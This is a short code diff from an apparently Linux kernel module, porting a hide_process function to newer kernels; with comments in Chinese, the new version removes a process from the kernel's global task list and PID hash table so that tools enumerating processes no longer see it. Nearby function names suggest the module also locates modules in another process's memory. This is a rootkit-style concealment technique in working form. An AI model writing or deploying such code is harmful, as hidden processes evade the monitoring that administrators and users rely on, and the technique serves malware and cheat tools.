@@ -126,19 +126,22 @@ int  get_proc_pid_list(char* name)
 }
 void hide_process(int pid)
 {
-    /* Linux kernel version 4.x.x */
-    struct task_struct *task = NULL;
-    struct pid_link *link = NULL;
-    struct hlist_node *node = NULL;
+    struct task_struct *task;
+    struct pid *pid_struct;
+    struct hlist_node *node;
 
-    task = pid_task(find_vpid(pid), PIDTYPE_PID);
-    link = &task->pids[PIDTYPE_PID];
-
-    list_del_rcu(&task->tasks);
-    INIT_LIST_HEAD(&task->tasks);
-    node = &link->node;
-    hlist_del_rcu(node);
-    INIT_HLIST_NODE(node);
+    rcu_read_lock();
+    pid_struct = find_get_pid(pid);
+    task = pid_task(pid_struct, PIDTYPE_PID);
+    if (task) {
+        // 从全局进程链表中移除
+        list_del_init(&task->tasks);
+        // 从PID散列表中移除
+        node = &task->pid_links[PIDTYPE_PID].node;
+        hlist_del_init(node);
+    }
+    rcu_read_unlock();
+    put_pid(pid_struct);
 }
 
 uintptr_t get_module_base(pid_t pid, char* name) 
